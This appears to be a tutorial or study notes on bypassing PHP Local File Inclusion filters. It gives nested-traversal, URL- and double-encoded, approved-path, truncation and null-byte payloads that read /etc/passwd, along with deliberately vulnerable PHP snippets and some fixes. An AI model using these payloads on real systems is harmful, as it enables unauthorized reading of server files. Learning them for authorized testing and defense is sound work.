# LFI Filter Bypasses

Most real-world LFI protections are implemented as blacklist filters or regex checks rather than proper allowlist validation. Each of these approaches has exploitable weaknesses, and understanding why each bypass works is more useful than memorising the payloads themselves.

***

## Non-Recursive Path Traversal Filters

The most common developer attempt at preventing path traversal is a simple string replacement that strips `../` from the input:

```php
$language = str_replace('../', '', $_GET['language']);
```

This fails because `str_replace()` makes a single pass over the string. It does not re-check the output after each replacement. The exploit takes advantage of this by nesting the filtered substring inside itself so that after the inner `../` is removed, the outer one reconstructs:

```
Input:    ....//....//....//....//etc/passwd
After filter removes ../: ../../../../etc/passwd
Result:   /etc/passwd (successfully traversed)
```

Several nesting variations achieve the same effect:

```
....//          → removes ../  → leaves ../
..././          → removes ../  → leaves ./  (still traverses in some parsers)
....\/          → escapes the slash, may bypass slash-aware filters
....////        → extra slashes are ignored by Linux filesystem
```

The fix for this class of filter is a recursive replacement that keeps running until no further matches are found, or ideally a proper path resolution check using `realpath()` followed by a prefix comparison.

***

## URL Encoding

Filters that block `.` and `/` characters on the raw input string can sometimes be bypassed by encoding those characters before they reach the filter. If the filter runs on the raw URL before decoding, but the include function operates on the decoded value, the payload slips through:

```
../   →   %2e%2e%2f
```

Full encoded payload for `../../../../etc/passwd`:
```
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

A critical detail: you must encode the dots as well as the slashes. Many URL encoders leave dots unencoded since they are considered valid URL characters. Burp Suite's Decoder tool handles full encoding including dots and is the most reliable way to generate these payloads.

If single encoding is blocked, double encoding applies the same logic a second time:
```
../   →   %2e%2e%2f   →   %252e%252e%252f
```

The server decodes `%25` to `%`, producing `%2e%2e%2f`, which is then decoded again by the include function to `../`. This only works against applications with two distinct decoding stages.

***

## Approved Path Bypass

Some applications use a regex to enforce that the path starts with an expected directory:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

The regex only checks that the string starts with `./languages/` and contains at least one more character. It does not validate that the resolved path stays inside that directory. The bypass is to satisfy the prefix requirement and then traverse out:

```
./languages/../../../../etc/passwd
```

The regex passes because the string starts with `./languages/`. The filesystem then resolves the `../../../../` traversal normally and lands on `/etc/passwd`. When combined with other filters, stack the techniques:

```
# Approved path + non-recursive filter bypass
./languages/....//....//....//....//etc/passwd

# Approved path + URL encoding
./languages/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

To identify what the approved path prefix should be, examine the GET requests made by the legitimate application features in Burp Suite. The valid language files reveal the expected path format.

***

## Appended Extension Bypasses

These two techniques only apply to PHP versions before 5.3 and 5.5 respectively. They are worth knowing because legacy applications running on old servers remain common, and no other bypass exists for appended extension restrictions on modern PHP.

### Path Truncation (PHP < 5.3)

PHP on 32-bit systems capped string length at 4096 characters. Anything beyond that was silently truncated. If the appended `.php` extension pushes the string past 4096 characters, it gets cut off, and the include operates on the truncated path without the extension.

The payload pads the path to just below 4096 characters so that adding `.php` pushes it over the limit:

```bash
# Generate the padding automatically
echo -n "non_existing_dir/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

The `non_existing_dir/` prefix is required because PHP also trimmed trailing dots and slashes on real paths. Using a non-existent directory prevents early path resolution from collapsing the string before truncation occurs. Linux also ignores redundant slashes and mid-path `.` references, so `./././` padding does not affect where the path resolves.

### Null Byte Injection (PHP < 5.5)

Null byte injection exploits how C-based string handling works at the memory level. Strings in C terminate at the first null byte (`\0`). PHP's include function, being implemented in C, stops reading the string at the null byte even if PHP-level string handling has already passed it:

```
/etc/passwd%00
```

With a `.php` extension being appended by the application, the include receives:
```
/etc/passwd%00.php
```

The null byte terminates the string before `.php` is reached, so the file included is `/etc/passwd` with no extension. This was patched in PHP 5.5 by sanitising null bytes before they reach filesystem functions.

***

## Bypass Decision Flow

When a straightforward `../../../../etc/passwd` payload fails, work through the bypass hierarchy:

```
1. Try ....// nesting              → defeats non-recursive str_replace
2. Try URL encoding %2e%2e%2f      → defeats character blacklists
3. Try double encoding %252e%252e  → defeats two-pass decode pipelines
4. Try approved path prefix        → satisfies regex, then traverse out
5. Combine 1+4, 2+4 as needed     → stacked filters require stacked bypasses
6. Check PHP version               → null byte or truncation if < 5.3/5.5
```

Verbose PHP errors are your best feedback mechanism during this process. When enabled, the error message shows the exact string passed to `include()`, which tells you precisely how your payload was modified by filters and which traversal depth is needed.
